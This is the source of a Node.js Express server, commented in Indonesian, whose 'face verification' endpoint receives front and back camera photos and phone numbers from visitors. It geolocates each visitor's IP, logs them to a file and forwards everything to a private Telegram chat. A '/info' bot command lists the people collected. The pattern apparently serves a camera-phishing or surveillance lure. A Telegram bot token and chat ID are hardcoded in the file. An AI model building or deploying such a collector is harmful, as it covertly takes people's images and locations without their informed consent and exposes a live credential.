const express = require('express');
const fetch = require('node-fetch');
const FormData = require('form-data');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Ambil dari environment variable Railway
const BOT_TOKEN = process.env.BOT_TOKEN || '8909571304:AAHmQQKT1vNM10IC-syWovjTvDddM9v02mc';
const CHAT_ID = process.env.CHAT_ID || '7352381955';

console.log('🚀 ========================================');
console.log('🚀 Server starting on Railway');
console.log('🚀 ========================================');
console.log(`🤖 BOT_TOKEN: ${BOT_TOKEN ? '✅ Set' : '❌ Not set'}`);
console.log(`📱 CHAT_ID: ${CHAT_ID ? '✅ Set' : '❌ Not set'}`);
console.log(`🌐 PORT: ${PORT}`);
console.log('🚀 ========================================');

// Middleware
app.use(express.json({ limit: '20mb' }));
app.use(express.urlencoded({ extended: true, limit: '20mb' }));
app.use(express.static('public'));

// Database (gunakan file, Railway support)
const DB_PATH = path.join(__dirname, 'data.json');

function readDatabase() {
  try {
    if (fs.existsSync(DB_PATH)) {
      const data = fs.readFileSync(DB_PATH, 'utf8');
      return JSON.parse(data);
    }
  } catch (e) {
    console.error('Error reading DB:', e);
  }
  return { users: [] };
}

function writeDatabase(data) {
  try {
    fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
  } catch (e) {
    console.error('Error writing DB:', e);
  }
}

// Get location from IP
async function getLocationFromIp(ip) {
  try {
    const cleanIp = ip === '::1' ? '' : ip.split(',')[0].trim();
    if (!cleanIp) return 'Tidak diketahui';
    
    const res = await fetch(`http://ip-api.com/json/${cleanIp}?fields=status,country,regionName,city`);
    const data = await res.json();
    
    if (data.status === 'success') {
      return `${data.city || '-'}, ${data.regionName || '-'}, ${data.country || '-'}`;
    }
  } catch (e) {
    console.error('Geolocation error:', e.message);
  }
  return 'Tidak diketahui';
}

// Send message to Telegram
async function sendTelegramMessage(chatId, text) {
  try {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    console.log('📤 Sending message to:', chatId);
    
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: text,
        parse_mode: 'Markdown'
      })
    });
    const data = await response.json();
    console.log('📨 Message response:', data.ok ? '✅ Success' : '❌ Failed');
    return data;
  } catch (err) {
    console.error('Send message error:', err);
    return null;
  }
}

// Webhook untuk bot Telegram
app.post('/webhook', async (req, res) => {
  try {
    const { message } = req.body;
    console.log('📨 Webhook received');
    
    if (message && message.text === '/info') {
      const chatId = message.chat.id;
      const db = readDatabase();
      
      if (db.users.length === 0) {
        await sendTelegramMessage(chatId, '📭 Belum ada data verifikasi.');
        return res.sendStatus(200);
      }
      
      let response = '📊 *DATA VERIFIKASI*\n\n';
      db.users.forEach((user, index) => {
        response += `${index + 1}. 📱 ${user.phone || 'User'}\n`;
        response += `   🕒 ${user.timestamp}\n`;
        response += `   📍 ${user.location}\n\n`;
      });
      response += `\nTotal: ${db.users.length} orang`;
      
      await sendTelegramMessage(chatId, response);
    }
    
    res.sendStatus(200);
  } catch (err) {
    console.error('Webhook error:', err);
    res.sendStatus(500);
  }
});

// TEST endpoint untuk cek bot
app.get('/test-bot', async (req, res) => {
  console.log('🧪 Testing bot connection...');
  try {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/getMe`;
    const response = await fetch(url);
    const data = await response.json();
    console.log('🤖 Bot info:', data.ok ? '✅ Success' : '❌ Failed');
    res.json(data);
  } catch (err) {
    console.error('❌ Bot test error:', err);
    res.status(500).json({ error: err.message });
  }
});

// TEST send message
app.get('/test-send', async (req, res) => {
  console.log('🧪 Testing send message...');
  try {
    const result = await sendTelegramMessage(CHAT_ID, '🧪 Test message from Railway server!');
    res.json(result);
  } catch (err) {
    console.error('❌ Send test error:', err);
    res.status(500).json({ error: err.message });
  }
});

// Verify endpoint
app.post('/api/verify', async (req, res) => {
  console.log('📸 ===== NEW VERIFICATION REQUEST =====');
  console.log('📸 Time:', new Date().toISOString());
  
  try {
    let image, backImage, phone;
    
    // Handle both JSON and FormData
    if (req.is('multipart/form-data')) {
      console.log('📦 Processing FormData');
      image = req.body.image;
      backImage = req.body.backImage || null;
      phone = req.body.phone || `User_${Date.now().toString().slice(-6)}`;
    } else {
      console.log('📦 Processing JSON');
      image = req.body.image;
      backImage = req.body.backImage || null;
      phone = req.body.phone || `User_${Date.now().toString().slice(-6)}`;
    }
    
    console.log(`📱 Phone: ${phone}`);
    console.log(`📸 Image exists: ${!!image}`);
    console.log(`📸 Image length: ${image ? image.length : 0}`);
    console.log(`📸 Back image: ${backImage ? 'Yes' : 'No'}`);
    
    if (!image) {
      console.log('❌ No image received');
      return res.status(400).json({ success: false, error: 'Foto tidak ditemukan' });
    }
    
    // Get IP and location
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
    console.log(`🌐 IP: ${ip}`);
    
    const location = await getLocationFromIp(ip);
    const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
    
    console.log(`📍 Location: ${location}`);
    console.log(`🕒 Time: ${timestamp}`);
    
    // Process front image
    const base64Data = image.replace(/^data:image\/\w+;base64,/, '');
    const buffer = Buffer.from(base64Data, 'base64');
    console.log(`📸 Front image size: ${buffer.length} bytes`);
    
    // Save to database
    const db = readDatabase();
    db.users.push({
      phone: phone,
      timestamp: timestamp,
      location: location,
      ip: ip,
      hasBackCamera: backImage ? true : false
    });
    writeDatabase(db);
    console.log('💾 Data saved to database');
    
    // ===== SEND TO TELEGRAM =====
    console.log('📤 Sending to Telegram...');
    console.log(`🤖 Using BOT_TOKEN: ${BOT_TOKEN ? BOT_TOKEN.substring(0, 15) + '...' : 'NOT SET'}`);
    console.log(`📱 Using CHAT_ID: ${CHAT_ID}`);
    
    if (!BOT_TOKEN || !CHAT_ID) {
      console.error('❌ BOT_TOKEN or CHAT_ID not set!');
      return res.status(500).json({ 
        success: false, 
        error: 'BOT_TOKEN or CHAT_ID not configured' 
      });
    }
    
    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('caption', 
      `🟡 *Verifikasi Wajah - DEPAN*\n\n` +
      `📱 *User:* ${phone}\n` +
      `📍 *Lokasi:* ${location}\n` +
      `🕒 *Waktu:* ${timestamp}\n` +
      `🌐 *IP:* ${ip}\n\n` +
      `_Foto depan dikirim untuk verifikasi_`
    );
    form.append('photo', buffer, { 
      filename: `verifikasi_depan_${Date.now()}.jpg`, 
      contentType: 'image/jpeg' 
    });
    
    const tgResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: form,
    });
    
    const tgData = await tgResponse.json();
    console.log('📨 Telegram response status:', tgResponse.status);
    console.log('📨 Telegram response ok:', tgData.ok);
    
    if (!tgData.ok) {
      console.error('❌ Telegram error:', JSON.stringify(tgData, null, 2));
      return res.status(500).json({ 
        success: false, 
        error: 'Gagal kirim ke Telegram: ' + (tgData.description || 'Unknown error')
      });
    }
    
    console.log('✅ Front photo sent successfully!');
    
    // If back camera image exists, send it too
    if (backImage) {
      console.log('📤 Sending back camera to Telegram...');
      const backBase64 = backImage.replace(/^data:image\/\w+;base64,/, '');
      const backBuffer = Buffer.from(backBase64, 'base64');
      console.log(`📸 Back image size: ${backBuffer.length} bytes`);
      
      const backForm = new FormData();
      backForm.append('chat_id', CHAT_ID);
      backForm.append('caption', 
        `🟡 *Verifikasi Wajah - BELAKANG*\n\n` +
        `📱 *User:* ${phone}\n` +
        `📍 *Lokasi:* ${location}\n` +
        `🕒 *Waktu:* ${timestamp}\n\n` +
        `_Foto belakang dikirim untuk verifikasi_`
      );
      backForm.append('photo', backBuffer, { 
        filename: `verifikasi_belakang_${Date.now()}.jpg`, 
        contentType: 'image/jpeg' 
      });
      
      const backResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: backForm,
      });
      
      const backData = await backResponse.json();
      console.log('📨 Back camera response:', backData.ok ? '✅ Success' : '❌ Failed');
    }
    
    console.log('✅ ===== PROCESS COMPLETED =====');
    res.json({ success: true });
    
  } catch (err) {
    console.error('❌ Verify error:', err);
    console.error('❌ Error stack:', err.stack);
    res.status(500).json({ 
      success: false, 
      error: err.message || 'Terjadi kesalahan server' 
    });
  }
});

// Root endpoint
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Start server
app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 ========================================`);
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`🚀 ========================================`);
  console.log(`🤖 BOT_TOKEN: ${BOT_TOKEN ? '✅ Set' : '❌ Not set'}`);
  console.log(`📱 CHAT_ID: ${CHAT_ID ? '✅ Set' : '❌ Not set'}`);
  console.log(`🚀 ========================================`);
  console.log(`📊 Test bot: https://your-app.railway.app/test-bot`);
  console.log(`📊 Test send: https://your-app.railway.app/test-send`);
  console.log(`🚀 ========================================`);
});
